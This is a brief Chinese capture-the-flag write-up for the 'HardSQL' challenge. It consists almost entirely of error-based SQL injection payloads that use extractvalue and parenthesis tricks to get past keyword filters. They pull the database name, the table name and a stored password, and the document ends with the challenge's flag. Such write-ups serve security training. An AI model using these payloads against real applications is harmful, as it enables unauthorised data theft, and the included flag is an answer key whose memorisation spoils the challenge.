# [极客大挑战 2019]HardSQL

## 考点

- 关键字过滤的绕过
- 报错注入

## 解题

```sql
1'or(select(extractvalue(1,concat(0x7e,(select(database()))))))#    geek


1'or(select(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))))))#    H4rDsq1


1'or(select(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))))#    flag{62d9045c-1d2e-4696-91a1-53

1'or(select(extractvalue(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1))))))#    e-4696-91a1-531495b885c6}


flag{62d9045c-1d2e-4696-91a1-531495b885c6}
```



